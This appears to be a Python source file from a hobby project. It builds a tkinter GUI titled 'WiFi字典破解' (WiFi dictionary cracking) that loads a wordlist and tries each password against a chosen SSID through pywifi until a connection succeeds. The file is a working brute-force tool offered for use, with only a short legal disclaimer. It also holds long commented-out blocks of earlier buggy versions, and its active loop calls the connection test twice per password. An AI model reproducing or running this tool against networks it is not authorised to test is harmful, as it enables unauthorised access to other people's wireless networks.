# =========================版权声明与说明===============================
'''
Author：ZS629 QQ536957230 & ChatGPT Plus（$20/month)
可以说这个项目基本上是由ChatGPT（OpenAI推出的生成式对话AI）生成的：
    生成原始代码和查bug借助了ChatGPT Plus(https://chat.openai.com/chat?model=gpt-4) || 
    给代码加注释（末尾的注释）用的Cursor（https://www.cursor.so)

在此期间，我发现ChatGPT生成的项目代码还是有很多bug，经过多次修改后，我们形成了这一个版本，现将其开源（这也是第一次在GitHub上公布项目，没想到是这样来的[/doge]）;
在这个版本中，我们使用了线程锁来确保同一时间只有一个线程在读取文件;
这样可以避免潜在的资源竞争问题;
代码的主要逻辑和之前的版本保持一致，但是增加了线程安全性;
现在，当多个线程试图访问文件时，只有一个线程可以获得文件锁，其他线程将等待，直到锁被释放;
这将确保密码列表在多线程环境中的正确读取。

Tips:以下代码仅用于跑字典的方式连接到WiFi （ 用于测试WiFi密码连接）。
此程序需配合“生成字典.py”使用,运行此文件前请先运行“生成字典.py”（生成多少自定义,有技术的也可以修改相关代码）
请勿将本程序用于任何非法行为或活动.如有违反,作者保留追究法律责任的权利。
'''

# =========================导入模块（需先安装）===============================
import threading
import pywifi  # 导入 pywifi 模块
from pywifi import const  # 导入 pywifi 模块中的 const 常量
import time  # 导入 time 模块
import tkinter as tk  # 导入 tkinter 模块并重命名为 tk
from tkinter import filedialog  # 从 tkinter 模块中导入 filedialog 子模块

# 定义全局变量 ssid 和 password_list
ssid = ''
password_list = []

# 建立一个线程锁来确保同一时间只有一个线程在读取文件
file_lock = threading.Lock()

# =========================函数的封装===============================
# 测试 WiFi 连接
def test_wifi_connection(ssid, password):
    wifi = pywifi.PyWiFi()  # 创建一个 PyWiFi 对象
    iface = wifi.interfaces()[0]  # 获取第一个无线网卡接口

    # 断开当前连接
    iface.disconnect()
    time.sleep(0.1)

    # 创建无线网络配置
    profile = pywifi.Profile()
    profile.ssid = ssid  # 设置 WiFi 名称
    profile.auth = const.AUTH_ALG_OPEN  # 设置 WiFi 认证算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 设置 WiFi 加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  # 设置 WiFi 加密方式
    profile.key = password  # 设置 WiFi 密码

    # 将配置添加到接口
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # 尝试连接
    iface.connect(tmp_profile)
    time.sleep(1)

    # 检查是否连接成功
    connected = iface.status() == const.IFACE_CONNECTED

    # 断开连接
    iface.disconnect()
    time.sleep(0.1)

    return connected

# 加载密码文件
def load_passwords():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])  # 弹出文件选择对话框并获取选择的文件路径
    print(file_path)
    t=threading.Thread(target=read_file,args=(file_path, handle_passwords_loaded))  # 创建一个新线程来读取文件
    t.start()

# 读取密码文件
def read_file(file_path, callback):
    global password_list
    
    # 如果用户选择了文件
    if file_path:  
        with file_lock:  # 使用线程锁
            with open(file_path, "r") as file:
                password_list = file.readlines()
                # print(password_list)
        password_list = [password.strip() for password in password_list]
    else:
        password_list = []
    callback(password_list)  # 修改这里，调用回调函数并传入 password_list

# 处理密码文件加载完成的回调函数
def handle_passwords_loaded(result):
    global password_list
    password_list = result
    app.after(0, start_testing)  # 使用 after 方法调用 start_testing 函数

# 开始测试
def start_testing():
    global password_list,ssid
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    
    # 如果密码列表为空
    if not password_list:  
        output.insert(tk.END, '请先加载密码文件!\n')  # 在 output 中显示提示信息
        output.see(tk.END)  # 滚动 output 到最后一行
        return
    
    t = threading.Thread(target=run_test, args=(ssid, password_list))  # 创建一个新线程来运行测试
    t.start()

# 真正运行测试的函数
def run_test(ssid, password_list):
    for password in password_list:  # 遍历密码列表
        app.after(0, lambda: output.insert(tk.END, f'Testing password: {password}\n'))  # 使用 after 方法在主线程中修改 GUI 组件
        app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件
        start_time = time.monotonic()  # 记录连接开始时间

        time.sleep(0.1)  # 延迟一段时间
        
        if test_wifi_connection(ssid, password):  # 如果密码正确
            '''             
            app.after(0, lambda: output.insert(tk.END, f'成功! WiFi密码是: {password}\n若未自动连接请尝试手动连接,耗时xx秒'))  # 使用 after 方法在主线程中修改 GUI 组件
            app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件
            print("测试完成")
            break  # 结束循环 
            '''
        if test_wifi_connection(ssid, password):  # 如果密码正确
            end_time = time.monotonic()  # 记录连接结束时间
            elapsed_time = end_time - start_time  # 计算连接耗时
            elapsed_time_str = f'{elapsed_time:.2f}秒'  # 格式化耗时为合适的字符串
            app.after(0, lambda: output.insert(tk.END, f'成功! WiFi密码是: {password}\n若未自动连接请尝试手动连接，耗时{elapsed_time_str}\n'))  # 使用 after 方法在主线程中修改 GUI 组件
            app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件
            print("测试完成")
            break  # 结束循环
        
        # 如果密码错误
        else:  
            app.after(0, lambda: output.insert(tk.END, '失败，下一个\n'))  # 使用 after 方法在主线程中修改 GUI 组件
            app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件


''' 
# 开始测试
def start_testing():
    global password_list,ssid
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    
    # 如果密码列表为空
    if not password_list:  
        output.insert(tk.END, '请先加载密码文件!\n')  # 在 output 中显示提示信息
        output.see(tk.END)  # 滚动 output 到最后一行
        return
    
    t = threading.Thread(target=run_test, args=(ssid, password_list))  # 创建一个新线程来运行测试
    t.start()
    
# 真正运行测试的函数
def run_test():
    global password_list,ssid
    
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    
    # 如果密码列表为空
    if not password_list:  
        app.after(0, lambda: output.insert(tk.END, '请先加载密码文件!\n'))  # 使用 after 方法在主线程中修改 GUI 组件
        app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件
        return
    
    for password in password_list:  # 遍历密码列表
        app.after(0, lambda: output.insert(tk.END, f'Testing password: {password}\n'))  # 使用 after 方法在主线程中修改 GUI 组件
        app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件

        time.sleep(0.1)  # 延迟一段时间
        
        if test_wifi_connection(ssid, password):  # 如果密码正确
            app.after(0, lambda: output.insert(tk.END, f'成功! WiFi密码是: {password}\n'))  # 使用 after 方法在主线程中修改 GUI 组件
            app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件
            break  # 结束循环
        
        # 如果密码错误
        else:  
            app.after(0, lambda: output.insert(tk.END, '失败，请重新生成字典!\n'))  # 使用 after 方法在主线程中修改 GUI 组件
            app.after(0, lambda: output.see(tk.END))  # 使用 after 方法在主线程中修改 GUI 组件 '''

app = tk.Tk()  # 创建一个名为 app 的窗口
app.title("WiFi字典破解")  # 设置窗口标题为 "WiFi Password Tester"

load_button = tk.Button(text="加载密码文件", command=load_passwords)  # 创建一个名为 load_button 的按钮
load_button.pack()  # 将 load_button 放置在窗口中

ssid_label = tk.Label(text="WiFi SSID:")  # 创建一个名为 ssid_label 的标签
ssid_label.pack()  # 将 ssid_label 放置在窗口中

ssid_entry = tk.Entry(width=30)  # 创建一个名为 ssid_entry 的文本框
ssid_entry.pack()  # 将 ssid_entry 放置在窗口中

start_button = tk.Button(text="开始破解", command=start_testing)  # 创建一个名为 start_button 的按钮
start_button.pack()  # 将 start_button 放置在窗口中

output = tk.Text(app, wrap=tk.WORD, width=50, height=20)  # 创建一个名为 output 的文本框
output.pack()  # 将 output 放置在窗口中

app.mainloop()  # 进入窗口消息循环

# =============================以下原始代码作废==================================
# ChatGPT生成的最初版代码（原始代码）以及后续生成的但仍有bug的代码作废（有能力的也可以自己尝试修复一下bug）
'''
ssid_label = tk.Label(text="WiFi SSID:")  # 创建一个名为 ssid_label 的标签
ssid_label.pack()  # 将 ssid_label 放置在窗口中

ssid_entry = tk.Entry(width=30)  # 创建一个名为 ssid_entry 的文本框
ssid_entry.pack()  # 将 ssid_entry 放置在窗口中

start_button = tk.Button(text="加载字典并启动", command=start_testing)  # 创建一个名为 start_button 的按钮
start_button.pack()  # 将 start_button 放置在窗口中

output = tk.Text(app, wrap=tk.WORD, width=50, height=20)  # 创建一个名为 output 的文本框
output.pack()  # 将 output 放置在窗口中

app.mainloop()  # 进入窗口消息循环 
'''

'''
# 读取密码文件
def read_file(file_path, callback):
    global password_list
    
    # 如果用户选择了文件
    if file_path:  
        with file_lock:  # 使用线程锁
            with open(file_path, "r") as file:
                password_list = file.readlines()
                print(password_list)
        password_list = [password.strip() for password in password_list]
    else:
        password_list = []
    callback
'''
    # 以下原始代码作废

'''
        with open(file_path, "r") as file:  # 打开文件并读取其中的内容
            password_list = file.readlines()  # 读取文件中的所有行
            print(password_list)
        password_list = [password.strip() for password in password_list]  # 去除每个密码字符串中的空格和换行符
        
    # 如果用户未选择文件
    else:  
        password_list = []  # 返回空的字符串列表
    callback(password_list) 
    '''

'''
import pywifi  # 导入 pywifi 模块
from pywifi import const  # 导入 pywifi 模块中的 const 常量
import time  # 导入 time 模块
import tkinter as tk  # 导入 tkinter 模块并重命名为 tk
from tkinter import filedialog  # 从 tkinter 模块中导入 filedialog 子模块 

def test_wifi_connection(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # 断开当前连接
    iface.disconnect()
    time.sleep(1)

    # 创建无线网络配置
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # 将配置添加到接口
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # 尝试连接
    iface.connect(tmp_profile)
    time.sleep(5)

    # 检查是否连接成功
    connected = iface.status() == const.IFACE_CONNECTED

    # 断开连接
    iface.disconnect()
    time.sleep(1)

    return connected
    # pass 

def load_passwords():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])  # 弹出文件选择对话框并获取选择的文件路径
    with open(file_path, "r") as file:  # 打开文件并读取其中的内容
        password_list = file.readlines()  # 读取文件中的所有行
    password_list = [password.strip() for password in password_list]  # 去除每个密码字符串中的空格和换行符
    return password_list

def start_testing():
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    password_list = load_passwords()  # 调用 load_passwords 函数获取密码列表

    for password in password_list:  # 遍历密码列表
        output.insert(tk.END, f'Testing password: {password}\n')  # 在 output 中显示正在测试的密码
        output.see(tk.END)  # 滚动 output 到最后一行
        if test_wifi_connection(ssid, password):  # 如果密码正确
            output.insert(tk.END, f'Success! The password is: {password}\n')  # 在 output 中显示密码破解成功
            output.see(tk.END)  # 滚动 output 到最后一行
            break  # 结束循环
        else:  # 如果密码错误
            output.insert(tk.END, 'Failed!\n')  # 在 output 中显示密码破解失败
            output.see(tk.END)  # 滚动 output 到最后一行 
app = tk.Tk()  # 创建一个名为 app 的窗口
app.title("WiFi Password Tester")  # 设置窗口标题为 "WiFi Password Tester"

ssid_label = tk.Label(text="WiFi SSID:")  # 创建一个名为 ssid_label 的标签
ssid_label.pack()  # 将 ssid_label 放置在窗口中

ssid_entry = tk.Entry(width=30)  # 创建一个名为 ssid_entry 的文本框
ssid_entry.pack()  # 将 ssid_entry 放置在窗口中

start_button = tk.Button(text="Load Passwords and Start Testing", command=start_testing)  # 创建一个名为 start_button 的按钮
start_button.pack()  # 将 start_button 放置在窗口中

output = tk.Text(app, wrap=tk.WORD, width=50, height=20)  # 创建一个名为 output 的文本框
output.pack()  # 将 output 放置在窗口中

app.mainloop()  # 进入窗口消息循环 

def load_passwords():
    global password_list
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    print(file_path)
    t=threading.Thread(target=read_file,args=(file_path,))
    t.start()

def read_file(file_path):
    global password_list
    if file_path:
        with open(file_path, "r") as file:
            password_list = file.readlines()
            print(password_list)
        password_list = [password.strip() for password in password_list]
    else:
        password_list = []

def start_testing():
    global password_list
    ssid = ssid_entry.get()
    if not password_list:
        output.insert(tk.END, '请先加载密码文件!\n')
        output.see(tk.END)
        return
    for password in password_list:
        output.insert(tk.END, f'Testing password: {password}\n')
        output.see(tk.END)
        time.sleep(1)
        if test_wifi_connection(ssid, password):
            output.insert(tk.END, f'成功! WiFi密码是: {password}\n')
            output.see(tk.END)
            break
        else:
            output.insert(tk.END, '失败，请重新生成字典!\n')
            output.see(tk.END)

def load_passwords():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")]) 
    t=threading.Thread(target=read_file,args=(file_path,))
    t.start() 
    

def load_passwords():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    print(file_path)
    t=threading.Thread(target=read_file,args=(file_path,))
    t.start()

def read_file(file_path):
    if file_path:  # 如果用户选择了文件
        with open(file_path, "r") as file:
            password_list = file.readlines()
            print(password_list)
        password_list = [password.strip() for password in password_list]
    else:  # 如果用户未选择文件
        password_list = []  # 返回空的字符串列表
    return password_list

def start_testing():
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    password_list = load_passwords()  # 调用 load_passwords 函数获取密码列表

    for password in password_list:  # 遍历密码列表
        output.insert(tk.END, f'Testing password: {password}\n')  # 在 output 中显示正在测试的密码
        output.see(tk.END)  # 滚动 output 到最后一行
        time.sleep(1)
        if test_wifi_connection(ssid, password):  # 如果密码正确
            output.insert(tk.END, f'成功! WiFi密码是: {password}\n')  # 在 output 中显示密码破解成功
            output.see(tk.END)  # 滚动 output 到最后一行
            break  # 结束循环
        else:  # 如果密码错误
            output.insert(tk.END, '失败，请重新生成字典!\n')  # 在 output 中显示密码破解失败
            output.see(tk.END)  # 滚动 output 到最后一行 

'''

'''
for password in password_list:  # 遍历密码列表
        output.insert(tk.END, f'Testing password: {password}\n')  # 在 output 中显示正在测试的密码
        output.see(tk.END)  # 滚动 output 到最后一行
        time.sleep(1)
        if test_wifi_connection(ssid, password):  # 如果密码正确
            output.insert(tk.END, f'成功! WiFi密码是: {password}\n')  # 在 output 中显示密码破解成功
            output.see(tk.END)  # 滚动 output 到最后一行
            break  # 结束循环
        
        # 如果密码错误
        else:  
            output.insert(tk.END, '失败，请重新生成字典!\n')  # 在 output 中显示密码破解失败
            output.see(tk.END)  # 滚动 output 到最后一行 
            '''

'''
# 开始测试 WiFi 密码
def start_testing():
    global password_list
    ssid = ssid_entry.get()  # 获取用户在 ssid_entry 中输入的 WiFi 名称
    
    # 如果密码列表为空
    if not password_list:  
        output.insert(tk.END, '请先加载密码文件!\n')  # 在 output 中显示提示信息
        output.see(tk.END)  # 滚动 output 到最后一行
        return
    for password in password_list:  # 遍历密码列表
        output.insert(tk.END, f'Testing password: {password}\n')  # 在 output 中显示正在测试的密码
        output.see(tk.END)  # 滚动 output 到最后一行
        time.sleep(1)
        if test_wifi_connection(ssid, password):  # 如果密码正确
            output.insert(tk.END, f'成功! WiFi密码是: {password}\n')  # 在 output 中显示密码破解成功
            output.see(tk.END)  # 滚动 output 到最后一行
            break  # 结束循环
        
        # 如果密码错误
        else:  
            output.insert(tk.END, '失败，请重新生成字典!\n')  # 在 output 中显示密码破解失败
            output.see(tk.END)  # 滚动 output 到最后一行 
'''

'''         
output.insert(tk.END, '请先加载密码文件!\n')  # 在 output 中显示提示信息
output.see(tk.END)  # 滚动 output 到最后一行
'''

'''         
output.insert(tk.END, f'Testing password: {password}\n')  # 在 output 中显示正在测试的密码
output.see(tk.END)  # 滚动 output 到最后一行
'''        









